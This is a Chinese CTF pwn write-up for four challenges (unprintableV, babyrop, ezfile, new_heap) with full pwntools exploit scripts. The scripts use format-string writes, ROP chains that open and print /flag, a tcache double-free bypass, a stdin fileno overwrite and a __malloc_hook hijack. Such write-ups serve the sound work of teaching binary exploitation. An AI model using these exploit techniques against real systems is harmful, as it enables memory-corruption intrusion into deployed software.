# pwn

感谢 Vidar-Team、L-Team、CNSS 带来的高质量比赛

## unprintableV

`libc2.27`

`pwnable.tw上`的`unprintable`魔改，第5版了。。我原先解pwnable.tw上这道题用的是把`bss`段上的`stdout`改成了`stderr`进行了泄露，这次这题也刚刚好用到了这个解法，不过这题禁用了`execve`,但是可以多次`printf`也不是什么大问题

一开始断点下在`printf(buf)`那里，栈的情况

```asm
 ► 0x55b7cd5bfa20    call   0x55b7cd5bf780
 
   0x55b7cd5bfa25    mov    eax, dword ptr [rip + 0x2015e5]
   0x55b7cd5bfa2b    sub    eax, 1
   0x55b7cd5bfa2e    mov    dword ptr [rip + 0x2015dc], eax
   0x55b7cd5bfa34    nop    
   0x55b7cd5bfa35    pop    rbp
   0x55b7cd5bfa36    ret    
 
   0x55b7cd5bfa37    push   rbp
   0x55b7cd5bfa38    mov    rbp, rsp
   0x55b7cd5bfa3b    mov    rax, qword ptr [rip + 0x2015de]
   0x55b7cd5bfa42    mov    ecx, 0
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rbp rsp  0x7ffcc627f8c0 —▸ 0x7ffcc627f8e0 —▸ 0x7ffcc627f900 —▸ 0x55b7cd5bfb60 ◂— push   r15
01:0008│          0x7ffcc627f8c8 —▸ 0x55b7cd5bfafb ◂— mov    edx, 6
02:0010│          0x7ffcc627f8d0 ◂— 0x7fff000000000006
03:0018│          0x7ffcc627f8d8 —▸ 0x55b7cd7c1060 ◂— '%216c%6$hhn'		//name
04:0020│          0x7ffcc627f8e0 —▸ 0x7ffcc627f900 —▸ 0x55b7cd5bfb60 ◂— push   r15
05:0028│          0x7ffcc627f8e8 —▸ 0x55b7cd5bfb51 ◂— mov    eax, 0
06:0030│          0x7ffcc627f8f0 —▸ 0x7ffcc627f9e8 —▸ 0x7ffcc62813cd ◂— './unprintableV'
07:0038│          0x7ffcc627f8f8 ◂— 0x100000000

```

可以看到有两条这样的链`0x7ffcc627f8c0 —▸ 0x7ffcc627f8e0 —▸ 0x7ffcc627f900 —▸ 0x55b7cd5bfb60 ◂— push   r15`,`0x7ffcc627f8f0 —▸ 0x7ffcc627f9e8 —▸ 0x7ffcc62813cd ◂— './unprintableV'`,而且一开始还给了栈地址，完美啊

所以思路是先让`03:0018│          0x7ffcc627f8d8 —▸ 0x55b7cd7c1060 ◂— '%216c%6$hhn'		//name`这里指向`bss`段上的`stdout`，然后把`stdout`改为`stderr`，看脸的时候到了，1/16的概率，注意下就是因为`close(1)`了，printf大于`0x2000`的字符数好像写不进去，所以爆破的时候用`p16(0x1680)`或者`p16(0x0680)`，成功的话`printf`就可以泄露啦，后面就随便玩了，:P

这次脸超级好，3次成功了两次，有点不太敢相信

exp为：

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def main(host,port=10397):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./unprintableV")
		# p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		# gdb.attach(p)
		debug(0x000000000000A20)
	p.recvuntil("gift: ")
	stack = int(p.recvuntil('\n',drop=True),16)
	info("stack : " + hex(stack))
	p.recvuntil("printf test!")
	
	payload = "%{}c%6$hhn".format(stack&0xff)
	p.send(payload)
	pause()
	payload = "%{}c%10$hhn".format(0x20)
	p.send(payload)
	pause()
	
	payload = "%{}c%9$hn".format(0x1680)
	p.send(payload)
	pause()
	payload = "+%p-%3$p*"
	p.send(payload.ljust(0x12c,"\x00"))
	
	p.recvuntil('+')
	elf_base = int(p.recvuntil('-',drop=True),16)+0x10
	info("elf : " + hex(elf_base))
	libc.address = int(p.recvuntil('*',drop=True),16)-0x110081
	success('libc : '+hex(libc.address))
	pause()
	ret_addr = stack-0x20
	payload = "%{}c%12$hn".format((stack-0x18)&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))
	
	# offset = 43
	payload = "%{}c%43$hn".format((elf_base)&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))
	
	payload = "%{}c%12$hn".format((stack-0x18+2)&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))
	
	# offset = 43
	payload = "%{}c%43$hn".format((elf_base>>16)&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))
	
	payload = "%{}c%12$hn".format((stack-0x18+4)&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))

	# offset = 43
	payload = "%{}c%43$hn".format((elf_base>>32)&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))
	
	payload = "%{}c%12$hn".format(ret_addr&0xffff)
	p.send(payload.ljust(0x12c,"\x00"))
	# 0x0000000000000bbd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	payload = "%{}c%43$hn".format((elf_base-0x202070+0xbbd)&0xffff)
	payload = payload.ljust(0x20,"\x00")
	payload += "/flag"+'\x00'*3
	# 0x00000000000a17e0: pop rdi; ret;
	# 0x0000000000023e6a: pop rsi; ret; 
	# 0x00000000001306d9: pop rdx; pop rsi; ret;
	p_rdi = libc.address+0x00000000000a17e0
	p_rsi = libc.address+0x0000000000023e6a
	p_rdx_rsi = libc.address+0x00000000001306d9
	rop = p64(p_rdi)+p64(elf_base+0x10)+p64(p_rsi)+p64(0)+p64(libc.symbols["open"])
	rop += p64(p_rdi)+p64(1)+p64(p_rdx_rsi)+p64(0x100)+p64(elf_base-0x70+0x300)+p64(libc.symbols["read"])
	rop += p64(p_rdi)+p64(2)+p64(p_rdx_rsi)+p64(0x100)+p64(elf_base-0x70+0x300)+p64(libc.symbols["write"])
	payload += rop
	p.send(payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# libc = ELF("./x64_libc.so.6",checksec=False)
	# elf = ELF("./unprintableV",checksec=False)
	main(args['REMOTE'])
```

## babyrop

`libc2.23`

题目有个简单的指令集，有个简单的栈结构(好像是这样

```c
00000000 stack           struc ; (sizeof=0x14, mappedto_6)
00000000 rsp_            dq ?
00000008 rbp_            dq ?
00000010 len             dd ?
00000014 stack           ends
```

然后就是指令集里有几个函数有`bug`

```c
  case '(':
        ++*idx;
        if ( !(unsigned int)clear_stack(v7, v6) )// !!!
          exit(0);
        return result;
```

```c
  case '4':
        ++*idx;
        sub_E17(v7);                            // !
        break;
```

```c
 case '!':
        sub_BB9(v7);                            // !
        ++*idx;
        break;
```

思路是先两次`((`让结构体里的`rsp_`越界

```asm
pwndbg> stack 30
00:0000│ rsp  0x7ffef245fbe0 —▸ 0x558692b96148 ◂— 0x2
01:0008│      0x7ffef245fbe8 —▸ 0x558692b96150 —▸ 0x7ffef245fca0 ◂— 0x11486eca0 !!!!
02:0010│      0x7ffef245fbf0 —▸ 0x558692b96140 ◂— 0x2
03:0018│      0x7ffef245fbf8 —▸ 0x558692b96040 ◂— 0x3400000000562828 /* '((V' */
04:0020│      0x7ffef245fc00 ◂— 0x0
... ↓
0e:0070│      0x7ffef245fc50 ◂— 0x100000100
0f:0078│      0x7ffef245fc58 ◂— 0xe11547f75d191800
10:0080│ rbp  0x7ffef245fc60 —▸ 0x7ffef245fc80 —▸ 0x558692995430 ◂— push   r15
11:0088│      0x7ffef245fc68 —▸ 0x558692994977 ◂— mov    edi, 0
12:0090│      0x7ffef245fc70 —▸ 0x7ffef245fd60 ◂— 0x1
13:0098│      0x7ffef245fc78 ◂— 0xe11547f75d191800
14:00a0│      0x7ffef245fc80 —▸ 0x558692995430 ◂— push   r15
15:00a8│      0x7ffef245fc88 —▸ 0x7fb21429f830 (__libc_start_main+240) ◂— mov    edi, eax
16:00b0│      0x7ffef245fc90 ◂— 0x1
17:00b8│      0x7ffef245fc98 —▸ 0x7ffef245fd68 —▸ 0x7ffef246120c ◂— './babyrop'
18:00c0│      0x7ffef245fca0 ◂— 0x11486eca0
```

两次`((`后：`01:0008│      0x7ffef245fbe8 —▸ 0x558692b96150 —▸ 0x7ffef245fca0 ◂— 0x11486eca0 !!!!`，可以看到已经越界了

然后就是利用栈上的`0x7fb21429f830 (__libc_start_main+240)`和那几个有bug的函数进行加加减减，最后把返回地址给改为`one_gadget`

```asm
► 0x558692995428                     leave  
   0x558692995429                     ret    
    ↓
   0x7fb2142c426a <do_system+1098>    mov    rax, qword ptr [rip + 0x37ec47]
   0x7fb2142c4271 <do_system+1105>    lea    rdi, [rip + 0x147adf]

```

exp为:

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def main(host,port=17676):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babyrop")
		# gdb.attach(p)
		debug(0x000000000000CB2)	
	payload = "((V"+p32(0)+"44V"+p32(0x24a3a)+"!44444"
	p.send(payload.ljust(0x100,"\x00"))
	p.interactive()	
if __name__ == "__main__":
	main(args['REMOTE'])
```

## ezfile

`libc2.27`

这题在给了hint后，想了很久，然后想起今年国赛有一题是吧`stdin`的`fileno`改为666，然后利用`scanf`和`printf`把`flag`打印出来，然后手动试了下这题，居然也可以。

这题有两个漏洞，一个是`deleteNote`没有把指针置零,一个是`encryptNode`函数的栈溢出，思路就是利用`double free`修改`stdin->fileno`为3，然后利用栈溢出`partial overwirte`改`encryptNode`返回地址到

```asm
.text:0000000000001147                 mov     eax, 0
.text:000000000000114C                 call    _open
.text:0000000000001151                 mov     cs:fd, eax
.text:0000000000001157                 mov     eax, cs:fd
.text:000000000000115D                 cmp     eax, 0FFFFFFFFh
```

至于为什么可以`open /flag`,是因为在`encryptNode`返回时

```asm
 RDI  0x7ffce9258610 ◂— 0x67616c662f /* '/flag' */
 RSI  0x0
 R8   0x7ffce92585f3 ◂— 0x1000000000a /* '\n' */
 R9   0x0
 R10  0x7f9c58fe5cc0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R11  0x246
 R12  0x55bdf8ef4980 ◂— xor    ebp, ebp
 R13  0x7ffce9258770 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffce9258670 ◂— 0x0
 RSP  0x7ffce9258610 ◂— 0x67616c662f /* '/flag' */
 RIP  0x55bdf8ef50e3 ◂— leave  
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x55bdf8ef50e3    leave  
   0x55bdf8ef50e4    ret    
    ↓
   0x55bdf8ef5147    mov    eax, 0

```

`RDI`会指向我们输入的内容，`RSI`就是` doSomeThing(seed, index)`的`index`参数，都是可控的，所以跳到`open`函数可以打开`/flag`,然后在配合

```c
  __isoc99_scanf("%90s", name);
  printf("welcome!%s.\n", name);
```

这样就会把flag打印出来

```
[*] welcome!d3ctf{3z_FIL3N0~@TT@cK-WIth-ST@Ck_0V3RFI0W}.
```

由于攻击到`stdin->fileno`我猜了两次地址，一次是堆地址，一次是libc地址，这样就1/256的几率，然后最后栈溢出的`patial overwrite`又要来一次1/16,所以最后成功几率是1/4096，（大家一起爆.jpg）出题人说还可以更低，orz

exp为：

```python
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil(">>")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("size of your note >>")
	p.sendline(str(sz))
	p.recvuntil("content >>")
	p.send(content)
def enc(idx,sz,seed):
	cmd(3)
	p.sendlineafter("encrypt >>",str(idx))
	p.sendlineafter("(max 0x50) >>",str(sz))
	p.sendafter("seed >>",seed)
def dele(idx):
	cmd(2)
	p.sendlineafter("delete >>",str(idx))

def main(host,port=24694):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./ezfile")
		# p = process("./pwn",env={"LD_PRELOAD":"./x64_libc.so.6"})
		# gdb.attach(p)
		debug(0x0000000000010E3)
	p.recvuntil("your name: ")
	p.sendline("A")
	add(0x10,p64(0)+p64(0x21))
	add(0x10,p64(0)+p64(0x21))
	
	# t = int(raw_input("guess: "))
	t = 11
	heap = (t << 12) | 0x00000000000120
	# t = int(raw_input("guess: "))
	t = 6
	stdin_fileno = (t << 12) | 0x00000000000a70
	# t = int(raw_input("guess: "))
	t = 7
	elf = (t << 12) | 0x000000000000147
	dele(1)
	dele(0)
	dele(0)
	add(2,p16(heap))
	
	add(0x10,p64(0)+p64(0x21))
	add(0x18,p64(0)+p64(0x441)+p64(0))
	dele(1)
	dele(0)
	dele(0)
	
	add(2,p16(heap+0x10))
	add(0x10,p64(0)+p64(0x21))

	add(0x10,p64(0)*2)
	dele(7)
	
	add(2,p16(stdin_fileno))
	dele(0)
	dele(0)
	add(2,p16(heap+0x10))
	add(1,"A")
	add(1,"A")
	add(1,"\x03")
	


	enc(20,0x6a,"/flag"+"\x00"*(0x63)+p16(elf))
	p.recvuntil("welcome!",timeout=1)
	flag = p.recvuntil('.\n',timeout=1)
	info(flag)
	p.interactive()
	
if __name__ == "__main__":
	for i in range(0x1000):
		try:
			main(args['REMOTE'])
		except Exception,err:
			p.close()
			print err
			continue
			
```



## new_heap

libc2.29有对tcache **double free** 进行check,这很蛋疼

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))	//如果我们可以把e->key即chunk的bk指针修改掉，那就可以绕过这个check
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```

题目就只有`add`和`dele`功能，`dele`没清空指针，但是由于有这个`check`在，有点难受，而且只能`add`18次,想了很久很久，在快结束的前几个小时试了下功能3就是退出那个函数，发现报错了（堆块重叠了导致报错），报的是`malloc_consolidate`的错，瞬间觉得有希望了，原因是

```c
void init_()
{
  void *ptr; // ST08_8

  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  alarm(0x1Eu);
  ptr = malloc(0x1000uLL);
  printf("good present for African friends:0x%x\n", (unsigned int)(((unsigned __int16)ptr & 0xFF00) >> 8));
  free(ptr);
}
```

这里开始的初始话没有`setbuf(stdin,0)`，于是乎在`getchar`的时候会再堆上申请一个`0x1000`大小的缓冲区，这样就不用浪费`add`的次数去申请一个大堆块，再配合题目的`dele`函数，就可以在限定次数下完成利用

先是

```python
	for i in range(8):
		add(0x78,"\x00"*0x78)
	for i in range(7):
		dele(i)
	dele(7)	#fastbin
	cmd(3)
	p.recvuntil("sure?")
	p.send("0")
```

这样`chunk7`被`malloc_consolidate`合并，然后在`add(0x68,"\x00"*0x68)	`一下，以防释放那个缓冲区的时候和`top_chunk`合并

```c
wndbg> telescope 0x5625febf8060 18
00:0000│   0x5625febf8060 —▸ 0x5625fec6a260 ◂— 0x0
01:0008│   0x5625febf8068 —▸ 0x5625fec6a2e0 —▸ 0x5625fec6a260 ◂— 0x0
02:0010│   0x5625febf8070 —▸ 0x5625fec6a360 —▸ 0x5625fec6a2e0 —▸ 0x5625fec6a260 ◂— 0x0
03:0018│   0x5625febf8078 —▸ 0x5625fec6a3e0 —▸ 0x5625fec6a360 —▸ 0x5625fec6a2e0 —▸ 0x5625fec6a260 ◂— ...
04:0020│   0x5625febf8080 —▸ 0x5625fec6a460 —▸ 0x5625fec6a3e0 —▸ 0x5625fec6a360 —▸ 0x5625fec6a2e0 ◂— ...
05:0028│   0x5625febf8088 —▸ 0x5625fec6a4e0 —▸ 0x5625fec6a460 —▸ 0x5625fec6a3e0 —▸ 0x5625fec6a360 ◂— ...
06:0030│   0x5625febf8090 —▸ 0x5625fec6a560 —▸ 0x5625fec6a4e0 —▸ 0x5625fec6a460 —▸ 0x5625fec6a3e0 ◂— ...
07:0038│   0x5625febf8098 —▸ 0x5625fec6a5e0 ◂— 0x30 /* '0' */
08:0040│   0x5625febf80a0 —▸ 0x5625fec6b5f0 ◂— 0x0
09:0048│   0x5625febf80a8 ◂— 0x0
... ↓
pwndbg> telescope 0x5625fec6a5d0
00:0000│   0x5625fec6a5d0 ◂— 0x0
01:0008│   0x5625fec6a5d8 ◂— 0x1011
02:0010│   0x5625fec6a5e0 ◂— 0x30 /* '0' */
03:0018│   0x5625fec6a5e8 ◂— 0x0
... ↓

```

我们可以看到`chunk7`和`getchar`申请的缓冲区重叠，也正是如此，我们可以利用`getchar`来修改`chunk7`的`bk`指针,然后就是

```python
	dele(7)
	add(0x68,"\x00"*0x68)
	dele(7)
	cmd(3)
	p.recvuntil("sure?")
	p.send("\x00"*0xe)
	dele(7)
```

可以看到成功**double free**，堆上也有了`libc`的指针

```c
tcachebins
0x70 [  2]: 0x55e3221f45e0 ◂— 0x55e3221f45e0
0x80 [  7]: 0x55e3221f4560 —▸ 0x55e3221f44e0 —▸ 0x55e3221f4460 —▸ 0x55e3221f43e0 —▸ 0x55e3221f4360 —▸ 0x55e3221f42e0 —▸ 0x55e3221f4260 ◂— 0x0
unsortedbin
all: 0x55e3221f4640 —▸ 0x7f6ba8af9ca0 (main_arena+96) ◂— 0x55e3221f4640
```

后面就是泄露`libc`和`getshell`了，要注意`add`的次数就好,泄露的时候还是有点看脸,不过1/16的几率多跑几次就好

exp为：

```python
from pwn import *

def cmd(c):
	p.recvuntil("3.exit")
	p.sendline(str(c))

def add(sz,content):
	cmd(1)
	p.recvuntil("size:")
	p.sendline(str(sz))
	p.recvuntil("content:")
	p.send(content)
def dele(idx):
	cmd(2)
	p.recvuntil("index:")
	p.sendline(str(idx))
def main(host,port=20508):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./new_heap")
		p = process("./new_heap",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p)
		
	p.recvuntil("friends:")
	heap = (int(p.recvuntil("\n",drop=True),16)>>4)<<12
	for i in range(8):
		add(0x78,"\x00"*0x78)
	for i in range(7):
		dele(i)
	dele(7)
	cmd(3)
	p.recvuntil("sure?")
	p.send("0")
	
	add(0x68,"\x00"*0x68)	
	
	dele(7)
	add(0x68,"\x00"*0x68)
	dele(7)
	cmd(3)
	p.recvuntil("sure?")
	p.send("\x00"*0xe)
	guess = int(raw_input("guess?"))
	# guess = 7
	stdout = (guess << 12) | 0x760
	add(0x58,p16(stdout-0x10))
	dele(7)
	add(0x68,p16(heap+0x650))
	add(0x68,"\x00"*0x68)
	add(0x68,"\x00"*0x68)
	add(0x68,b"\x00"*0x10+p64(0xfbad1800)+p64(0)*3+b'\x00')
	p.recv(8)
	libc.address = u64(p.recv(8))-0x3b5890
	success('libc : '+hex(libc.address))
	dele(7)
	for i in range(13):
		cmd(3)
	cmd(3)
	p.recvuntil("sure?")
	p.send(p64(libc.symbols["__malloc_hook"]-0x23))
	
	add(0x68,"\x00"*0x68)
	add(0x68,b"\x00"*0x13+p64(libc.address+0xdf212))
	cmd(1)
	p.recvuntil("size:")
	p.sendline(str(0))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	main(args["REMOTE"])
```





